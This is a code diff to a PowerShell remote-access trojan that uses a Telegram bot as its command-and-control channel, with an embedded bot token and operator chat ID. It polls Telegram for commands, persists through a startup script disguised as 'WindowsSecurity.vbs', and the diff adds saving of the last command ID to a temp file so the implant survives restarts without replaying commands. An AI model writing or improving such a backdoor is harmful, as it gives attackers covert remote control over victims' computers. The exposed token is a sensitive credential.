@@ -2,7 +2,14 @@ $token = "8817701294:AAGtc6EO7ln-vZ88RsH_IC76z5N5nmOzQLc"
 $chatId = "7432282760"
 $apiUrl = "https://api.telegram.org/bot$token"
 
-$lastUpdateId = 0
+# --- Əvvəlki update ID-ni yaddaşdan oxu ---
+$stateFile = "$env:TEMP\last_update.txt"
+if (Test-Path $stateFile) {
+    $lastUpdateId = [int](Get-Content $stateFile -Raw).Trim()
+} else {
+    $lastUpdateId = 0
+}
+
 $currentDir = "C:\"
 
 # --- Köməkçi: mesaj göndər ---
@@ -72,6 +79,7 @@ while ($true) {
         if ($updates.ok -and $updates.result.Count -gt 0) {
             foreach ($update in $updates.result) {
                 $lastUpdateId = $update.update_id
+                Set-Content -Path $stateFile -Value $lastUpdateId -Force
                 if ("$($update.message.chat.id)" -eq "$chatId") {
                     $command = $update.message.text
                     if ([string]::IsNullOrWhiteSpace($command)) { continue }
@@ -155,6 +163,7 @@ Telegram C2 - Emrler:
                         $startupFolder = [Environment]::GetFolderPath('Startup')
                         $vbsPath = Join-Path $startupFolder "WindowsSecurity.vbs"
                         Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
+                        Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                         Send-Message "C2 dayandirilir, VBS startup-dan silindi"
                         exit
                     }
